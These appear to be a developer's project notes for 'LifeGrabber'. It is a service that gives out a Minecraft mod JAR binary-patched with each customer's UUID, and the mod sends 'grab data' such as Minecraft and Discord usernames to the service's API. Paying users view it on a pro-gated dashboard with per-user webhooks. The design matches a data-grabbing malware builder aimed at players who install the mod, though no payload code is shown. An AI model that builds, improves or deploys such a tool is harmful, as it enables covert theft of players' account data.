# LifeGrabber Project Notes

## Critical: ModConfig Binary Patching
The mod JAR has `ModConfig.class` with the string literal `"PLACEHOLDER_UUID"`. At download time, the API binary-patches this string to the actual user's UUID via JSZip.

**IMPORTANT**: The Java source MUST return the string directly, NOT as a `static final` field:
```java
// CORRECT - string literal returned directly
public static String getOwnerEmail() {
    if (ownerEmail != null) return ownerEmail;
    ownerEmail = "PLACEHOLDER_UUID";
    return ownerEmail;
}

// WRONG - Java inlines static final values at compile time
private static final String PLACEHOLDER_UUID = "00000000-...";
public static String getOwnerEmail() { return PLACEHOLDER_UUID; }
```

The binary patcher (`lib/patch-class.js` or inline in `app/api/download/route.js`) searches for the UTF8 constant `PLACEHOLDER_UUID` (tag 0x01 + 2-byte length + string bytes) and replaces it with the actual UUID.

## How the UUID Flow Works
1. User downloads mod from Build page → API generates UUID, stores in `user_uuids` table, binary-patches ModConfig.class
2. Mod runs → `getOwnerEmail()` returns the patched UUID
3. Mod sends grab data with `owner_email = <UUID>` to POST /api/grabs
4. API looks up UUID in `user_uuids` table → resolves to email
5. Grab stored with `owner_email = <resolved email>`
6. Dashboard GET /api/grabs filters by `owner_email = session user email`

## Mod Source Code Location
`C:\Users\giode\AppData\Roaming\.minecraft\MyMod\consentmod-template-1.21.11`
- Source: `src/main/java/com/consentmod/`
- Build: `gradlew.bat build` (must use `cmd /c` wrapper on this machine)
- Output JAR: `build/libs/consentmod-1.0.0.jar`
- Copy to web project: `public/mods/consentmod-1.0.0.jar`

## Key Files
- `app/api/download/route.js` — Generates UUID, stores in user_uuids, binary-patches JAR
- `app/api/grabs/route.js` — POST: UUID→email resolution; GET: filtered by session email
- `app/api/admin/users/route.js` — Admin: list users, toggle pro
- `app/api/user/pro/route.js` — Check if user has pro access
- `app/admin/page.js` — Admin panel (lifegrading@gmail.com only)
- `app/dashboard/page.js` — Main dashboard (pro-gated)
- `lib/patch-class.js` — Binary patching utility (if extracted)
- `lib/supabase/schema.sql` — Full DB schema

## Database Tables
- `grabs` — Grab data with `owner_email`, `minecraft_username`, `discord_username`, etc.
- `user_uuids` — Maps `mod_uuid` → `email`
- `user_settings` — Webhook URL per email
- `user_minecraft` — Minecraft username ↔ email
- `mod_versions` — Version counter per email
- `users` — Extended auth users with `is_pro` boolean

## Admin Panel
- `/admin` — Only lifegrading@gmail.com can access
- Toggle pro on/off per user
- Non-pro users see "Pro Required" on dashboard, grabs, build, settings

## Build Commands
```bash
# Build mod (in mod project directory)
cmd /c "gradlew.bat build"

# Copy JAR to web project
Copy-Item "...\build\libs\consentmod-1.0.0.jar" "...\public\mods\consentmod-1.0.0.jar" -Force

# Test binary patching
node tmp/test-patch.js

# Push to git (auto-deploys to Vercel)
git add public/mods/consentmod-1.0.0.jar && git commit -m "..." && git push
```

## PowerShell Notes
- `npm` and `vercel` must be wrapped with `cmd /c` due to execution policy
- Use `cmd /c "vercel logs ..." ` for Vercel CLI commands
